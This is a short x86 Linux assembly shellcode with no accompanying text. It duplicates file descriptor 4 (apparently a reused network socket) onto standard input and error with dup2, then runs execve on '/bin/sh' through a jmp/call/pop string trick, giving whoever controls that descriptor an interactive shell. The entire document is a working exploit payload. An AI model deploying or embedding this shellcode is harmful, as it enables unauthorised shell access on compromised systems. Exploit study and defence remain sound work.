global _start
_start:

xor	eax, eax
xor	ebx, ebx
xor	ecx, ecx


inc	ebx
inc	ebx
inc	ebx
inc	ebx
; dup2 is 63

mov	al, 63
int	0x80

inc	ecx
;mov	al, 63
;int	0x80

inc	ecx
mov	al, 63
int	0x80

jmp short string
code:

; store pointer to /bin/sh in ebx
pop		ebx
xor 		ecx, ecx
xor 		edx, edx
mov		al, 0xb ; execve
int 	0x80


string:
call code
db	'/bin/sh', 0x0
